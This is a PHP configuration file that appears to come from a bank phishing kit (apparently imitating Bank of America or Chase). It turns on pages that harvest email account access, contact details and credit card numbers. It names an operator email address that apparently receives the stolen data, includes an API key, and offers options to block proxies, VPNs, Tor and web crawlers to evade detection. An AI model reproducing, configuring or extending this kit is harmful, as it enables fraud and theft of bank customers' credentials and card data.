<?php

$one_time_access ="yes";
$allow_country = "no";

$show_start_page = "yes"; //
$show_email_access_question = "yes"; //
$show_contact_information = "yes";//
$show_credit_card = "yes";//
$show_success_page = "yes";//


$your_email = "w1ckwickjohn@yandex.com"; // Your Fucking Email Here bro !! 
$redirect = "boa"; // you can change this 


$redirection = "no";     			   // If you won't to Use Redirection Like { Domain.com?id=chase } Make it Yes .
$api_protection = "no";  			   // This Api For detect Frauds And Bad Bot fROM IP .
$Key = "MB2GhIkLGWAkgirr54WrVRyDMibLfq1v"; // Your Key api protection DON't CHANGE IT BRO ...

$anti_proxy = "no";
$anti_vpn = "no";
$anti_tor = "no";
$anti_web_crawler ="no";
$max_fraud_score = "101";

?>